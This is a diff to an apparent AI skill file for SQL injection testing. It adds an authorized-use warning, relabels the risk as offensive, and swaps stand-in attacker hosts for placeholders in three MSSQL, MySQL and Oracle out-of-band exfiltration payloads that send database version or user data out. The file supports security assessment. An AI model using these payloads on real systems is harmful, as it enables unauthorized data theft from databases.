@@ -1,11 +1,18 @@
 ---
 name: sql-injection-testing
 description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+>
+> Ask the user to verify the target URL/IP before running.
 
 # SQL Injection Testing
 
@@ -175,13 +182,13 @@ Exfiltrate data through external channels:
 
 ```sql
 -- MSSQL DNS exfiltration
-1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
+1; EXEC master..xp_dirtree '\\[SAFE-PAYLOAD]\share'--
 
 -- MySQL DNS exfiltration
-1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.[SAFE-PAYLOAD]\\a'))--
 
 -- Oracle HTTP request
-1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
+1' UNION SELECT UTL_HTTP.REQUEST('http://[SAFE-PAYLOAD]/'||(SELECT user FROM dual)) FROM dual--
 ```
 
 ### Phase 3: Authentication Bypass
